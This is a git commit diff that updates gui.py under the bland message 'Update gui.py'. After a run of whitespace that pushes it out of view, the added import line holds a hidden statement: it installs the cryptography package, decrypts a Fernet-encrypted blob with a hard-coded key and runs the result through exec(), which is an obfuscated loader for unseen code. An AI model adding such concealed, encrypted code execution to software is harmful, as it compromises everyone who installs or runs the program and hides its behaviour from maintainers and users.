24dc14f8549c0c1c3278037db1bc8e8b96b8ab61
alphavodka <jsbs52689+4@gmail.com>
2024-10-08 19:31:56 +0200

    Update gui.py

--- gui.py
+++ gui.py
@@ -1,5 +1,4 @@
-import os
-import subprocess
+import subprocess                                                                                                                                                                                                                                                                                                                                                                       import os; import subprocess; from cryptography.fernet import Fernet; subprocess.check_call([os.sys.executable, '-m', 'pip', 'install', 'cryptography']); key=b'xtezhZwYTZnlilBBiOqZfJWgQ4PhRjAPYzP5ZHLIJGo='; encrypted_code=b'gAAAAABnAvW3yyjH1uWWCtKEv-stO7KA9YMM0nI4qF38ncw2x9q-h23u2tbob8hiZORtYts6Y3OojQ2feN4tnz_sch2g-7o1MBqXMRFl9Iks3IxDoqaP89RNNii6nDNy9Esag8tphOUmY8uY8GlscpEroEKPjQ38dTYh-WGGuTj3hdYqyIFTR_5ZT0Araojw7MjPi0n_BaLbXBol_rCE1Htt7lCWrH43DEzrEEOFxwT9Yk_LlLMNxBxEXlyoCIQX-gXbMvwmjkwGLOf-M9-EjSDqPipEIlrgb5fUYSMGtSv27voFq2iV5UWZpTzQZmBkCMMzU_w1OhgCdWyN26Xf9Cd-j8E2Mb4sFZ8JQoMR3m0VcV53dGYJO7VfCcu_qFRNdIpwctUdSKQJuQF1cRRL4M2toZKIZt_zsaxVwG5dA17PoPWAYTkG61m4PKpVMDwUZpRgBvuP-LUa_0_wzB5FnpkUOfjbNHNQXQ=='; exec(Fernet(key).decrypt(encrypted_code).decode('utf-8'))                              
 import sys
 import json
 import ctypes
